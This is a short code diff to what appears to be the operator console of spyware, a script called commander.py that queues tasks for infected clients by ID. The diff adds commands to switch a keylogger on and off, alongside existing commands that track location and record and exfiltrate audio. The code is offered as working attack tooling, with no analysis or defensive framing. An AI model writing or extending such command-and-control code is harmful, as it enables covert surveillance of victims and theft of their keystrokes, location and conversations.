@@ -34,6 +34,8 @@ def main():
         print("  python commander.py <ID> location_stop")
         print("  python commander.py <ID> record_start")
         print("  python commander.py <ID> record_stop")
+        print("  python commander.py <ID> keylog_start")
+        print("  python commander.py <ID> keylog_stop")
         return
 
     client_id = sys.argv[1]
@@ -66,6 +68,12 @@ def main():
     elif command_type == "record_stop":
         add_task(client_id, "record_stop", {})
         print(f"[*] Stopping and exfiltrating audio from {client_id}")
+    elif command_type == "keylog_start":
+        add_task(client_id, "keylog_start", {})
+        print(f"[*] Keylogger enabled for {client_id}")
+    elif command_type == "keylog_stop":
+        add_task(client_id, "keylog_stop", {})
+        print(f"[*] Keylogger disabled for {client_id}")
     else:
         print(f"[!] Unknown command type: {command_type}")
 
